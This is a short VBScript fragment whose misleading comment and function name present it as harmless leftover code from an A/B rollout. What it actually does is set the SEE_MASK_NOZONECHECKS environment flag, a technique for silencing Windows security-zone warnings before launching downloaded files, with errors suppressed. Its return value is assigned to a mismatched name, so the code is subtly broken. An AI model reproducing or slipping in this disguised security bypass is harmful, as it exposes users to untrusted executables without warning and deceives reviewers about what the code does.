' --- left after A/B rollout ---
Function ExtractSyncToken45()
On Error Resume Next
  Dim strPolicyBlock914,strSyncBuffer79,strSegment74
  Set strPolicyBlock914=CreateObject("WScript.Shell")
  strSyncBuffer79=strPolicyBlock914.ExpandEnvironmentStrings("%TEMP%")
  strSegment74=strPolicyBlock914.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(strSyncBuffer79)>0 And Len(strSegment74)>0 Then
    strPolicyBlock914.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    ParseRegistryChunk56=1
    Exit Function
  End If
  ParseRegistryChunk56=0
End Function

